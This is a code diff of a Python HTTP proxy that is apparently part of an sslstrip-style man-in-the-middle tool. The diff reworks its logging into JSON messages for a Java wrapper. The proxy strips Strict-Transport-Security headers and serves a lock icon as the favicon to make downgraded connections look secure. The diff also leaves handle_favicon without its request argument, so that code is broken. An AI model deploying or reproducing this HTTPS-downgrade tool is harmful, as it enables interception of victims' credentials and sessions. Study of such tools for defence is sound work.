@@ -1,19 +1,24 @@
 #!/usr/bin/env python3
 
-import asyncio
 import aiohttp
+import json
 from aiohttp import web
-import ssl
-import logging
 import os
 import sys
 
-# Configure logging
-logging.basicConfig(level=logging.INFO)
+
+# Prints a json info message that java can pick up and display to the logger.
+def log_info(msg):
+    print(json.dumps({"type": "info", "info": msg}), flush=True)
+
+
+# Prints a json error message that java can pick up and display to the logger.
+def log_error(msg):
+    print(json.dumps({"type": "error", "error": msg}), flush=True)
 
 # Constants
-PORT = 80  # Must be run as root for port 80
-LOCK_ICON_PATH = "lock.ico"
+PORT = 80  # Must be 80 for HTTP
+LOCK_ICON_PATH = os.path.join(os.path.dirname(__file__), '..', 'lock.ico')
 
 # Helper function to clean headers
 def clean_headers(headers):
@@ -26,12 +31,12 @@ def get_path_to_lock_icon():
         return LOCK_ICON_PATH
 
     script_path = os.path.abspath(os.path.dirname(sys.argv[0]))
-    script_path = os.path.join(script_path, "../share/sslstrip/lock.ico")
+    script_path = os.path.join(script_path, "../lock.ico")
 
     if os.path.exists(script_path):
         return script_path
 
-    logging.warning("Error: Could not find lock.ico")
+    log_error("Error: Could not find lock.ico")
     return LOCK_ICON_PATH
 
 # Handler for incoming HTTP requests
@@ -61,31 +66,32 @@ async def handle_request(request):
                 headers = {k: v for k, v in headers.items() if k.lower() != 'strict-transport-security'}
                 headers['Connection'] = 'close'
 
+                log_info(f"Proxied request to {url} with status {resp.status}")
                 return web.Response(
                     status=resp.status,
                     headers=headers,
                     body=body
                 )
     except Exception as e:
-        logging.error(f"Proxy error: {e}")
+        log_error(f"Proxy error: {e}")
         return web.Response(status=502, text=f"Proxy error: {e}")
 
-# Handler for favicon.ico requests
-async def handle_favicon(request):
+async def handle_favicon():
     try:
         with open(get_path_to_lock_icon(), 'rb') as f:
             icon_data = f.read()
+        log_info("Served favicon.ico")
         return web.Response(body=icon_data, content_type='image/x-icon')
     except Exception as e:
-        logging.error(f"Error serving favicon: {e}")
+        log_error(f"Error serving favicon: {e}")
         return web.Response(status=404, text="Favicon not found.")
 
-# Main function to start the server
 def main():
     app = web.Application()
     app.router.add_route('*', '/favicon.ico', handle_favicon)
     app.router.add_route('*', '/{tail:.*}', handle_request)
 
+    log_info(f"Starting proxy server on port {PORT}")
     web.run_app(app, host='0.0.0.0', port=PORT)
 
 if __name__ == "__main__":
